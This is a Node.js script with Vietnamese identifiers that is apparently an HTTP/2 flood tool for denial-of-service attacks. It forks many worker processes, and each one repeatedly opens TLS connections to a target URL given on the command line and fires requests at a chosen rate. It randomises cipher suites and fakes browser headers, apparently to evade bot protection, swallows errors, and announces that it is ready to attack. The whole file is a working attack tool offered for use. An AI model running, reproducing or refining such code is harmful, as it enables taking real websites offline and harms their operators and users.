const url = require('url'), fs = require('fs'), http2 = require('http2'), http = require('http'), tls = require('tls'), net = require('net'), cluster = require('cluster'), crypto = require('crypto'), HPACK = require('hpack'), os = require('os'), Buffer = require('buffer').Buffer;
const MAX_PHAN_TRAM_RAM = 95, THOI_GIAN_KHOI_DONG_LAI = 100, DANH_SACH_MA_HOA = ['TLS_AES_128_CCM_8_SHA256','TLS_AES_128_CCM_SHA256','TLS_CHACHA20_POLY1305_SHA256','TLS_AES_256_GCM_SHA384','TLS_AES_128_GCM_SHA256'], DANH_SACH_SIGALGS = ['ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512','ecdsa_brainpoolP256r1tls13_sha256','ecdsa_brainpoolP384r1tls13_sha384','ecdsa_brainpoolP512r1tls13_sha512','ecdsa_sha1','ed25519','ed448','ecdsa_sha224','rsa_pkcs1_sha1','rsa_pss_pss_sha256','dsa_sha256','dsa_sha384','dsa_sha512','dsa_sha224','dsa_sha1','rsa_pss_pss_sha384','rsa_pkcs1_sha2240','rsa_pss_pss_sha512','sm2sig_sm3','ecdsa_secp521r1_sha512'], SIG = DANH_SACH_SIGALGS.join(':'), DANH_SACH_LOI_BO_QUA = ['RequestError','StatusCodeError','CaptchaError','CloudflareError','ParseError','ParserError','TimeoutError','JSONError','URLError','InvalidURL','ProxyError'], MA_LOI_BO_QUA = ['SELF_SIGNED_CERT_IN_CHAIN','ECONNRESET','ERR_ASSERTION','ECONNREFUSED','EPIPE','EHOSTUNREACH','ETIMEDOUT','ESOCKETTIMEDOUT','EPROTO','EAI_AGAIN','EHOSTDOWN','ENETRESET','ENETUNREACH','ENONET','ENOTCONN','ENOTFOUND','EAI_NODATA','EAI_NONAME','EADDRNOTAVAIL','EAFNOSUPPORT','EALREADY','EBADF','ECONNABORTED','EDESTADDRREQ','EDQUOT','EFAULT','EHOSTUNREACH','EIDRM','EILSEQ','EINPROGRESS','EINTR','EINVAL','EIO','EISCONN','EMFILE','EMLINK','EMSGSIZE','ENAMETOOLONG','ENETDOWN','ENOBUFS','ENODEV','ENOENT','ENOMEM','ENOPROTOOPT','ENOSPC','ENOSYS','ENOTDIR','ENOTEMPTY','ENOTSOCK','EOPNOTSUPP','EPERM','EPIPE','EPROTONOSUPPORT','ERANGE','EROFS','ESHUTDOWN','ESPIPE','ESRCH','ETIME','ETXTBSY','EXDEV','UNKNOWN','DEPTH_ZERO_SELF_SIGNED_CERT','UNABLE_TO_VERIFY_LEAF_SIGNATURE','CERT_HAS_EXPIRED','CERT_NOT_YET_VALID'];
const xuLyLoi = function(loi) {};
process.on("uncaughtException", xuLyLoi); process.on("unhandledRejection", xuLyLoi);
function maHoaFrame(streamId, type, payload, flags) {payload = payload || "";flags = flags || 0;const frame = Buffer.alloc(9 + payload.length);frame.writeUInt32BE(payload.length << 8 | type, 0);frame.writeUInt8(flags, 4);frame.writeUInt32BE(streamId, 5);if (payload.length > 0) frame.set(payload, 9);return frame;}
function taoChuoiNgauNhien(doDaiMin, doDaiMax) {const kyTu='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',doDai=Math.floor(Math.random()*(doDaiMax-doDaiMin+1))+doDaiMin;let ketQua='';for(let i=0;i<doDai;i++){ketQua+=kyTu.charAt(Math.floor(Math.random()*kyTu.length));}return ketQua;}
function xaoTronObject(obj, objThem) {const objKetQua={};for(const key in obj){objKetQua[key]=obj[key];}if(objThem){for(const key in objThem){objKetQua[key]=objThem[key];}}return objKetQua;}
function taoHeaders(parsed, nodeVersion) {const cache=["no-cache","no-store","no-transform","only-if-cached","max-age=0","must-revalidate","public","private","proxy-revalidate","s-maxage=86400"],headers={":method":"GET",":authority":parsed.host,":scheme":"https",":path":parsed.path},headersNgauNhien={"sec-ch-ua":'\\"Not)B;Brand\\";v=\\"'+(Math.floor(Math.random()*90000)+10000)+'\\", \\"Google Chrome\\";v=\\"'+nodeVersion+'\\", \\"Chromium\\";v=\\"'+nodeVersion+'\\"',"Pragma":"no-cache"};if(Math.random()<0.4){headersNgauNhien["cache-control"]=cache[Math.floor(Math.random()*cache.length)];}if(Math.random()<0.8){headersNgauNhien["sec-ch-ua-mobile"]="?0";}headersNgauNhien["sec-fetch-site"]=Math.random()<0.2?"none;none":"none";headersNgauNhien["sec-fetch-mode"]=Math.random()<0.2?"navigate;navigation":"navigate";headersNgauNhien["sec-fetch-user"]=Math.random()<0.2?"?1;?1":"?1";if(Math.random()<0.5){headersNgauNhien["sec-fetch-dest"]="document";}headersNgauNhien["accept"]="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";if(Math.random()<0.3){headersNgauNhien["polion-sec-cf"]="GAY-"+taoChuoiNgauNhien(1,2);}if(Math.random()<0.6){const key1=taoChuoiNgauNhien(1,2)+"-night-thef-"+taoChuoiNgauNhien(1,2);headersNgauNhien[key1]="zffs-"+taoChuoiNgauNhien(1,2);}if(Math.random()<0.6){const key2="accept-client-"+taoChuoiNgauNhien(1,2);headersNgauNhien[key2]="router-"+taoChuoiNgauNhien(1,2);}if(Math.random()<0.3){headersNgauNhien["Crisx-Sec-HOPEFULL"]="zeus-bff";}headersNgauNhien["accept-encoding"]=Math.random()<0.5?"gzip, deflate, br, zstd":"gzip, deflate, br, cdnfly";headersNgauNhien["sec-ch-ua-platform"]="Fake-Windows"+"="+taoChuoiNgauNhien(1,4)+"?"+taoChuoiNgauNhien(5,30);const headersFinal=xaoTronObject(headers,headersNgauNhien);headersFinal["user-agent"]=process.argv[7]||"Mozilla/5.0";headersFinal["cookie"]=process.argv[6]||"";if(Math.random()<0.5){headersFinal["upgrade-insecure-requests"]="1";}headersFinal["accept-language"]="ru,en-US;q=0.9,en;q=0.8";return headersFinal;}
process.on('uncaughtException',function(e){if((e.code&&MA_LOI_BO_QUA.includes(e.code))||(e.name&&DANH_SACH_LOI_BO_QUA.includes(e.name))){return false;}}).on('unhandledRejection',function(e){if((e.code&&MA_LOI_BO_QUA.includes(e.code))||(e.name&&DANH_SACH_LOI_BO_QUA.includes(e.name))){return false;}}).on('warning',function(e){if((e.code&&MA_LOI_BO_QUA.includes(e.code))||(e.name&&DANH_SACH_LOI_BO_QUA.includes(e.name))){return false;}}).setMaxListeners(0);
const target=process.argv[2], thoiGian=process.argv[3], soLuongTienTrinh=process.argv[4], soRequestMoiGiay=process.argv[5];
if(!target||!/^(https?):\/\//i.test(target)){console.error('Phải cung cấp URL target với http:// hoặc https://');process.exit(1);}
if(isNaN(soRequestMoiGiay)||soRequestMoiGiay<=0){console.error('Số request mỗi giây phải là số lớn hơn 0');process.exit(1);}
if(cluster.isMaster){console.log("@CRISXTOP");for(let i=1;i<=soLuongTienTrinh;i++){cluster.fork();}const khoiDongLai=function(){for(const id in cluster.workers){cluster.workers[id].kill();}console.log('[>] Khởi động lại script sau',THOI_GIAN_KHOI_DONG_LAI,'ms...');setTimeout(function(){for(let i=1;i<=soLuongTienTrinh;i++){cluster.fork();}},THOI_GIAN_KHOI_DONG_LAI);};const kiemTraRAM=function(){const tongRAM=os.totalmem(),dungRAM=tongRAM-os.freemem(),phanTramRAM=(dungRAM/tongRAM)*100;if(phanTramRAM>=MAX_PHAN_TRAM_RAM){console.log('[!] Vượt quá ngưỡng RAM:',phanTramRAM.toFixed(2),'%');khoiDongLai();}};setInterval(kiemTraRAM,5000);setTimeout(function(){process.exit(-1);},thoiGian*1000);}else{setInterval(tanCong,1);}
function tanCong(){const parsed=url.parse(target),maHoa=DANH_SACH_MA_HOA[Math.floor(Math.random()*DANH_SACH_MA_HOA.length)],nodeVersion=Math.floor(Math.random()*10)+115,headers=taoHeaders(parsed,nodeVersion),cauHinhTLS={ciphers:maHoa,minVersion:'TLSv1.2',maxVersion:'TLSv1.3',sigals:SIG,secureOptions:crypto.constants.SSL_OP_NO_RENEGOTIATION|crypto.constants.SSL_OP_NO_TICKET|crypto.constants.SSL_OP_NO_SSLv2|crypto.constants.SSL_OP_NO_SSLv3|crypto.constants.SSL_OP_NO_COMPRESSION|crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION|crypto.constants.SSL_OP_TLSEXT_PADDING|crypto.constants.SSL_OP_ALL,echdCurve:"X25519",maxRedirects:20,followAllRedirects:true,secure:true,rejectUnauthorized:false,ALPNProtocols:['h2']};const tlsSocket=tls.connect({ciphers:cauHinhTLS.ciphers,minVersion:cauHinhTLS.minVersion,maxVersion:cauHinhTLS.maxVersion,sigals:cauHinhTLS.sigals,secureOptions:cauHinhTLS.secureOptions,echdCurve:cauHinhTLS.echdCurve,maxRedirects:cauHinhTLS.maxRedirects,followAllRedirects:cauHinhTLS.followAllRedirects,secure:cauHinhTLS.secure,rejectUnauthorized:cauHinhTLS.rejectUnauthorized,ALPNProtocols:cauHinhTLS.ALPNProtocols,host:parsed.host,port:443,servername:parsed.host});tlsSocket.setKeepAlive(true,60000);tlsSocket.allowHalfOpen=true;tlsSocket.setNoDelay(true);tlsSocket.setMaxListeners(0);const client=http2.connect(parsed.href,{settings:{headerTableSize:65536,enablePush:false,initialWindowSize:6291456,maxFrameSize:16384},createConnection:function(){return tlsSocket;}});client.on('error',function(err){client.destroy();tlsSocket.destroy();});setInterval(function(){if(tlsSocket.destroyed)return;const req=client.request(headers);req.on('response',function(){req.close();req.destroy();});req.on('error',function(){req.destroy();});req.end();},1000/soRequestMoiGiay);}
console.log('[THONG_TIN] Script đã sẵn sàng tấn công:');console.log('- Mục tiêu:',target);console.log('- Thời gian:',thoiGian,'giây');console.log('- Số tiến trình:',soLuongTienTrinh);console.log('- Số request mỗi giây:',soRequestMoiGiay);console.log('- User Agent:',process.argv[7]||"Mặc định");console.log('- Cookie:',process.argv[6]?"Có":"Không");